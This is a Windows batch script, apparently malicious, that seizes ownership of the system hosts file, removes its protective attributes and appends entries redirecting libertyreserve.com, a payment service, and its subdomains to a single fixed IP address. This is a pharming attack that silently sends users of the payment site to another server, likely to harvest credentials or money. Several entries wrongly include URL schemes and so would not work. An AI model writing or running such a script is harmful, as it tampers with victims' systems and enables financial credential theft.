@echo off 
takeown /f "%windir%\system32\drivers\etc\hosts" && icacls "%windir%\system32\drivers\etc\hosts" /grant administrators:F
attrib -s -h -r %windir%\system32\drivers\etc\hosts
%windir%\notepad.exe %windir%\system32\drivers\etc\hosts
echo 69.195.86.234 libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 www.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 http://www.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 http://libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 sci.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 http://sci.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 http://www.sci.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 https://www.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 https://libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 https://sci.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts
echo 69.195.86.234 https://www.sci.libertyreserve.com>>C:\Windows\System32\drivers\etc\hosts